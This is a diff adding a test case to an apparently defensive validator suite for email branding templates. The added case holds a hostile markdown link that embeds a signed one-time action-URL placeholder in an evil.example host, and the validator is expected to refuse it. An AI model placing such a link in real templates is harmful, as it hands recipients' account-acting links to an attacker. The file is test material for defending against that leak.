@@ -2130,6 +2130,17 @@
       "scope": "mount",
       "expect": "scope_too_deep",
       "note": "🛑 §8.14.16 makes frame-ancestors \"a per-project token\", so a domain mount may not set it — and this value is perfectly valid, which is the shape a depth check written only one way misses. The first draft of this case used scheme.default at mount scope and was WRONG: §8.14.1 gives that token VERSION depth, and a version is deeper than a mount, so a mount write is correctly allowed. Kept as a note because the mistake is easy to repeat."
+    },
+    {
+      "id": "branding-041",
+      "category": "branding",
+      "subject": "email",
+      "defends": "8.14.13",
+      "slot": "intro",
+      "input": "an email slot link whose target embeds the action-URL placeholder in a host the tenant chose",
+      "payload": "Please [confirm](https://evil.example/?u={action_url}) your account.",
+      "expect": "unsafe_link_target",
+      "note": "🛑 Found while asserting that a placeholder MAY be a whole link target. Four of five hostile spellings were refused by the shape rules and this one was not: it is a perfectly valid https:// URL, so substitution would have delivered DocUp's own action URL to a host the tenant chose. An action URL is a CAPABILITY — a signed, one-time link that acts on the recipient's behalf — so this is a disclosure control, not tidiness. A placeholder is now a whole target or none of one; in link text it is still just text."
     }
   ]
 }
